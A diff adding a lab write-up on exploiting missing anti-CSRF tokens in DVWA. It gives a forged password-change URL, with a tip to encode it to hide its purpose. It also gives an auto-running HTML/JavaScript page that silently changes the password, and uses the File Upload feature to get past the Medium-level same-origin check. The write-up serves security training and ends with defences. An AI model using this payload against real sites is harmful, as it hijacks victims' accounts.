@@ -1,0 +1,79 @@
+Resources:
+
+http://projects.webappsec.org/w/page/13246919/Cross%20Site%20Request%20Forgery
+https://cwe.mitre.org/data/definitions/352.html
+https://nvd.nist.gov/vuln/detail/CVE-2022-22811
+https://www.stackzero.net/csrf-dvwa/
+
+What is Absence of Anti-CSRF Tokens:
+
+The absence of Anti-CSRF Tokens makes a web application unable to verify whether a valid request was made by the user that sent it, which allows a Cross Site Request Forgery (CSRF) to occur. A CSRF attack takes advantage of a website's trust for a user by forcing the user to send an HTTP request without their knowledge in order to perform an action as the victim.
+
+Easy vs. Medium Exploit:
+
+Easy:
+
+Step 1: Log into DVWA
+
+Step 2: Click on the CSRF tab
+
+Step 3: Try changing the password so that you gain access to the URL
+
+Step 4: Edit the URL of the page from http://localhost:(port number)/vulnerabilities/csrf/?password_new=&password_conf=&Change=Change# to http://localhost:(port number)/vulnerabilities/csrf/?password_new=(password)&password_conf=(password)&Change=Change#
+
+	For Example: http://localhost/vulnerabilities/csrf/?password_new=newpassword1&password_conf=newpassword1&Change=Change#
+
+Step 5 (optional): Encode the URL to hide its purpose
+
+Step 6: Use the URL to change the password
+
+Step 7: Try logging out and back in to DVWA
+
+Medium:
+
+Step 1: Log into DVWA and ensure you are at Low level
+
+Step 2: Click on the File Upload tab
+
+Step 3: Create a HTML file with the following code and update the URL as needed: 
+		
+<html>
+    <head>
+
+    </head>
+    <body onload="change_password()">
+    <script>
+    	function change_password(){
+        const request = new XMLHttpRequest();
+        const url = 'http://localhost/vulnerabilities/csrf/?password_new=newpassword2&password_conf=newpassword2&Change=Change#'
+       
+        request.open("GET", url);
+    
+        request.send();
+	}
+
+    </script>
+    </body>
+</html>
+
+Step 4: Upload the file that you made
+
+Step 5: Swap your security type to Medium level
+
+Step 6: Use the URL http://localhost:(port number)/hackable/uploads/(name of html file).html
+
+	For Example: http://localhost/hackable/uploads/CSRF_MedLevel.html
+
+Step 7: Try logging out and back in to DVWA
+
+Why it was able to be exploit:
+
+Due to the way that the website is configured, you are able to see and edit the URL that is being searched for by the page. By modifying the URL, you are able to modify the three variable that are being sent: "password_new", "password_conf", and "Change". This is what allows you to create a malicious link that could cause someone to unintentionally change their password to this website. At low level security, there is nothing stopping you from being able to modify these variables in order to create a malicious link. However, at medium level security, the website checks whether or not the request that is being made is coming from the same domain. Due to this change, you are now no longer able to simply change the URL to exploit this vulnerability. In order to get around this, you can create an HTML file that contains JavaScript that searches for a malicious link whenever the page is loaded. When you upload this file to DVWA and search the URL for the file upload, you are able to exploit this vulnerability.
+
+Solutions:
+
+- Utilize an existing secure framework or library
+- Ensure that the website has no known XSS issues, as they can be used to get around CSRF defenses
+- Ensure that the request being made originated from an expected page
+
+
